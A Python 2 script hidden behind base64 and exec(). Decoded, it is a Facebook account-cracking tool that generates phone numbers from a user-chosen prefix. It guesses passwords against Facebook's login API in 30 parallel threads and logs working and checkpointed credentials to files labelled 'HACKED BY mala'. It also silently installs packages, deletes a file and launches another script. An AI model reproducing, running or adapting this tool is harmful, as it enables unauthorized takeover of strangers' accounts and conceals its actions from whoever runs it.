import base64
exec(base64.b64decode("aW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCByYW5kb20sIGhhc2hsaWIsIHJlLCB0aHJlYWRpbmcsIGpzb24sIHVybGxpYiwgY29va2llbGliLCBnZXRwYXNzCm9zLnN5c3RlbSgncm0gLXJmIC50eHQnKQpmb3IgbiBpbiByYW5nZSgxMDAwMDApOgogICAgbm1iciA9IHJhbmRvbS5yYW5kaW50KDExMTExMSwgOTk5OTk5KQogICAgc3lzLnN0ZG91dCA9IG9wZW4oJy50eHQnLCAnYScpCiAgICBwcmludCBubWJyCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCByZXF1ZXN0cycpCgp0cnk6CiAgICBpbXBvcnQgbWVjaGFuaXplCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIG9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIG1lY2hhbml6ZScpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBvcy5zeXN0ZW0oJ3B5dGhvbjIgYWYucHknKQoKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbApmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgpyZWxvYWQoc3lzKQpzeXMuc2V0ZGVmYXVsdGVuY29kaW5nKCd1dGY4JykKYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQpici5zZXRfaGFuZGxlX3JlZnJlc2gobWVjaGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksIG1heF90aW1lPTEpCmJyLmFkZGhlYWRlcnMgPSBbKCd1c2VyLWFnZW50JywgJ0RhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IE5YNTUgQnVpbGQvS09UNTUwNikgW0ZCQU4vRkI0QTtGQkFWLzEwNi4wLjAuMjYuNjg7RkJCVi80NTkwNDE2MDtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2l0X0lUO0ZCUlYvNDU5MDQxNjA7RkJDUi9Qb3N0ZU1vYmlsZTtGQk1GL2FzdXM7RkJCRC9hc3VzO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0FTVVNfWjAwQUQ7RkJTVi81LjA7RkJPUC8xO0ZCQ0EveDg2OmFybWVhYmktdjdhO10nKV0KCmRlZiBleGIoKToKICAgIHByaW50ICdbIV0gRXhpdCcKICAgIG9zLnN5cy5leGl0KCkKCgpkZWYgcHNiKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykKCgpkZWYgdCgpOgogICAgdGltZS5zbGVlcCgxKQoKCmRlZiBjYigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCgoKbG9nbyA9ICIiIgogX19fX19fICAgX19fX19fXyBfICAgXyAgX19fICBfICAgXwp8ICBfIFwgXCAvIC9fICAgX3wgfCB8IHwvIF8gXHwgXCB8IHwKfCB8XykgXCBWIC8gIHwgfCB8IHxffCB8IHwgfCB8ICBcfCB8CnwgIF9fLyB8IHwgICB8IHwgfCAgXyAgfCB8X3wgfCB8XCAgfAp8X3wgICAgfF98ICAgfF98IHxffCB8X3xcX19fL3xffCBcX3wKClwwMzNbMzY7MW1DT0RFIEJZIDogUHl0aG9uLVRlYW0KXDAzM1szMjsxbUNIQU5ORUwgOiB0Lm1lL3B5dGhvbjQ1MwpcMDMzWzM1OzFtQ0hBTk5FTCAyOiB0Lm1lL3RlYW00NTMKXDAzM1szMzsxbUdST1BDSEFUOiB0Lm1lL1B5dGhvbjU2NAoKCiIiIgpiYWNrID0gMApzdWNjZXNzZnVsID0gW10KY3BiID0gW10Kb2tzID0gW10KaWQgPSBbXQoKZGVmIFN1bHRhbmkoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgNDIgKiAnficKICAgIHByaW50ICcgIFswMV0gQ1JBQ0sgIEFMTCBDb3VudHJ5ICBXSVRIIE5VTUJFUlMgJwogICAgcHJpbnQgNDIgKiAnficKICAgIE1vaGFtbWFkKCkKCgpkZWYgTW9oYW1tYWQoKToKICAgIGdsb2JhbCBjcGIKICAgIGdsb2JhbCBva3MKICAgIGJjaCA9IHJhd19pbnB1dCgnIEVOVEVSIE5VTUJFUiA+PiAxICcpCiAgICBpZiBiY2ggPT0gJyc6CiAgICAgICAgcHJpbnQgJ1shXSBGaWxsIGluIGNvcnJlY3RseScKICAgICAgICBNb2hhbW1hZCgpCiAgICBlbGlmIGJjaCA9PSAnMSc6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50ICcgIEhBQ0sgQUxMIENPVU5UUlkgRkIgJwogICAgICAgIHRyeToKICAgICAgICAgICAgayA9IHJhd19pbnB1dCgnIDA3OCBkYWdyYSA6ICcpCiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJyA4IGRhZ3JhICcpCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCgogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBTdWx0YW5pKCkKCiAgICBlbGlmIGJjaCA9PSAnMCc6CiAgICAgICAgZXhiKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQgJ1shXSBOb3QgRnVuZHMgRmlsZXMnCiAgICAgICAgTW9oYW1tYWQoKQogICAgeHh4ID0gc3RyKGxlbihpZCkpCiAgICBwc2IoJyBUT1RBTCAgIE5VTUJFUlM6ICcgKyB4eHgpCiAgICB0aW1lLnNsZWVwKDAuMSkKICAgIHBzYignIFBMRUFTIFdISVQuLi4nKQogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwcmludCA0MCAqICd+JwoKICAgIGRlZiBtYWluKGFyZyk6CiAgICAgICAgdXNlciA9IGFyZwogICAgICAgIHRyeToKICAgICAgICAgICAgb3MubWtkaXIoJ3NhdmUnKQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICBwYXNzCgogICAgICAgIHRyeToKICAgICAgICAgICAgcGFzczEgPSB1c2VyCiAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQogICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtDSEVDS1BPSU5UXVx4MWJbMTs5MW0gJyArIGsgKyBjICsgdXNlciArICcgIG5vICcgKyBwYXNzMSArICdcbicgKyAnXG4nCiAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzYXZlL0hBQ0tFRCBCWSBtYWxhICAgLnR4dCcsICdhJykKICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICsgYyArIHVzZXIgKyAnICAgJyArIHBhc3MxICsgJ1xuJykKICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGMgKyB1c2VyICsgcGFzczEpCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm0gSEFDS0VEIEJZIG1hbGFceDFiWzE7OTJtICcgKyBrICsgYyArIHVzZXIgKyAnICB5ZXMgICcgKyBwYXNzMSArICdcbicKICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvY2hlY2twb2ludC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgJyAgICcgKyBwYXNzMSArICdcbicpCiAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQogICAgICAgICAgICAgICAgY3BiLmFwcGVuZChjICsgdXNlciArIHBhc3MxKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgCXBhc3MyID0iMTAwMjAwIgogICAgICAgICAgICBkYXRhID0gYnIub3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPScgKyBrICsgYyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczEgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykKICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bQ0hFQ0tQT0lOVF1ceDFiWzE7OTFtICcgKyBrICsgYyArIHVzZXIgKyAnICBOTyAgJyArIHBhc3MxICsgJ1xuJyArICdcbicKICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvIEhBQ0tFRCBCWSBtYWxhIC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgJyAgICcgKyBwYXNzMSArICdcbicpCiAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjICsgdXNlciArIHBhc3MyKQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtSEFDS0VEIEJZIG1hbGFceDFiWzE7OTJtICcgKyBrICsgYyArIHVzZXIgKyAnICB5ZXMgICcgKyBwYXNzMiArICdcbicKICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvY2hlY2twb2ludC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgJyAgICAnICsgcGFzczIgKyAnXG4nKQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBwID0gVGhyZWFkUG9vbCgzMCkKICAgIHAubWFwKG1haW4sIGlkKQogICAgcHJpbnQgNDIgKiAnXHgxYlsxOzkxbT0nCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTNtIFByb2Nlc3MgSGFzIEJlZW4gQ29tcGxldGVkIC4uLi4nCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTJtIFRvdGFsIHN1Y2Nlc3NmdWxsL1x4MWJbMTs5Nm1jaGVja3BvaW50IDogJyArIHN0cihsZW4ob2tzKSkgKyAnLycgKyBzdHIobGVuKGNwYikpCiAgICBwcmludCAnW1x4ZTJceDljXHg5M11ceDFiWzE7OTFtIENQIEZpbGUgSGFzIEJlZW4gU2F2ZWQgOiBzYXZlL2NoZWNrcG9pbnQudHh0JwogICAgcmF3X2lucHV0KCdcbltQcmVzcyBFbnRlciBUbyBHbyBCYWNrXScpCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIFN1bHRhbmkoKQ=="))
